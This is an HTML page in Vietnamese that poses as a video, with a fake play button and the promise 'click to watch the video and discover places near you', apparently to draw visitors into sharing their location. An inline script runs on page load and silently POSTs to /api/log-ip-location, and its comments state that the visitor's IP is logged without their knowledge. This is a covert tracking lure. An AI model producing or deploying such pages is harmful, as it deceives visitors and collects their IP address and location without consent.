<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Yêu cầu vị trí thân thiện</title>
    <link rel="stylesheet" href="style.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
    />
  </head>
  <body>
    <div class="location-prompt-container">
      <div class="fake-video" id="location-trigger">
        <video muted loop playsinline class="background-video">
          <source src="video1.mp4" type="video/mp4" />
          Trình duyệt của bạn không hỗ trợ thẻ video.
        </video>

        <i class="fa-solid fa-play"></i>
      </div>
      <p class="prompt-text">
        Nhấn để xem video và khám phá các địa điểm gần bạn!
      </p>
    </div>

    <script src="script.js"></script>

    <script>
      // Sự kiện này sẽ được kích hoạt ngay khi cấu trúc HTML của trang đã tải xong
      document.addEventListener('DOMContentLoaded', () => {
        // Lặng lẽ gửi một yêu cầu (request) đến server để ghi log IP.
        // Quá trình này hoàn toàn tự động và người dùng không hề hay biết.
        fetch('/api/log-ip-location', {
          method: 'POST'
        })
        .then(response => response.json())
        .then(data => {
          // Bạn có thể mở Developer Tools (F12) -> Console để thấy thông báo này
          console.log('Server response for IP logging:', data.message);
        })
        .catch(error => {
          console.error('Lỗi khi tự động ghi log IP:', error);
        });
      });
    </script>
  </body>
</html>
